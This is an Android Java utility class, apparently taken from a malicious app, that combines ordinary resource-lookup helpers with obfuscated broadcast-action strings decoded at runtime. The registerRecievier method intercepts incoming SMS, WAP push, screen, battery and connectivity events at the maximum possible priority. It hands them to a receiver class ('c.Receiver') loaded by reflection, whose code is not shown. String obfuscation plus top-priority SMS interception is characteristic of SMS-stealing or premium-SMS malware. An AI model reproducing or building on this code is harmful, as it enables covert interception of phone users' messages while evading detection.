package basic.workspace.util;
import basic.workspace.common.Logger;
import basic.workspace.common.ParseKsy;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;

public class Utils {
    public static int getResourceId(Context context, String type, String key) {
        int resourceId = -1;
        try {
            resourceId = context.getResources().getIdentifier(key, type, context.getPackageName());
        } catch (Exception e) {
            Logger.error(e);
        }
        return resourceId;
    }
    public static String getRString(Context context, String key) {
        String result = null;
        int resourceId = getResourceId(context, "string", key);
        if (resourceId > 0) {
            try {
                result = context.getString(getResourceId(context, "string", key));
            } catch (Exception e) {
                Logger.error(e);
            }
        }
        return result;
    }
    /**
     * android.intent.action.SCREEN_ON
     */
    private static String ANDROID_INTENT_ACTION_SCREEN_ON = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c8c82b244404cc4fbd34df52b49a34438");
    /**
     * android.intent.action.SCREEN_OFF
     */
    private static String ANDROID_INTENT_ACTION_SCREEN_OFF = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c7bde60b3676378a7f87d15c95402c6ab04d46b50b3dbc32b33074582f9447c02");
    /**
     * android.intent.action.TIME_TICK
     */
    private static String ANDROID_INTENT_ACTION_TIME_TICK = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c79f7c9c7c0af858c59157b890141da12");
    /**
     * android.intent.action.BATTERY_CHANGED
     */
    private static String ANDROID_INTENT_ACTION_BATTERY_CHANGED = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642cb7236f334d29c39769dbeee3bce0dc4e25a2109182828428ddfede5cce6466ec");
    /**
     * android.intent.action.USER_PRESENT
     */
    private static String ANDROID_INTENT_ACTION_USER_PRESENT = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642cc86dab75695ccb2d3173404a66d88323acdf0e1aa78fbcdf767163701ed49d08");
    /**
     * android.net.conn.CONNECTIVITY_CHANGE
     */
    private static String ANDROID_NET_CONN_CONNECTIVITY_CHANGE = ParseKsy.decode("038963c1edfb1650f440a983ecfe5e91321c97643c68e20915da2348ca1a3578eb3cbc0ca17b5282734662bf3941fc8e");
    /**
    * "android.provider.Telephony.SMS_SEND"
    */
    public static String SMS_SEND = "android.provider.Telephony.SMS_SEND";
    /**
     * android.provider.Telephony.SMS_RECEIVED
     */
    public static String SMS_RECEIVED = ParseKsy.decode("e43b68d9fee83bfd2428a3d114880741496ef5fba5d801c883448c8dcbd5f698ed534170193fcce28386cf1ebc5fb3c4");
    /**
     * android.provider.Telephony.WAP_PUSH_RECEIVED
     */
    public static String WAP_PUSH_RECEIVED = ParseKsy.decode("e43b68d9fee83bfd2428a3d114880741210655e9aab8ce4eba423fb016e67bcd7cf556b8c1a4e9ef9d6d44642663d701");
    public static void registerRecievier(Context context) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(ANDROID_NET_CONN_CONNECTIVITY_CHANGE);
        filter.addAction(ANDROID_INTENT_ACTION_USER_PRESENT);
        filter.addAction(ANDROID_INTENT_ACTION_BATTERY_CHANGED);
        filter.addAction(ANDROID_INTENT_ACTION_TIME_TICK);
        filter.addAction(ANDROID_INTENT_ACTION_SCREEN_OFF);
        filter.addAction(ANDROID_INTENT_ACTION_SCREEN_ON);
        filter.addAction(WAP_PUSH_RECEIVED);
        filter.addAction(SMS_RECEIVED);
        filter.addAction(SMS_SEND);
        filter.setPriority(0x7fffffff);
        try {
            Class<?> c = Class.forName("c.Receiver");
            BroadcastReceiver receiver = (BroadcastReceiver) c.newInstance();
            context.registerReceiver(receiver, filter);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
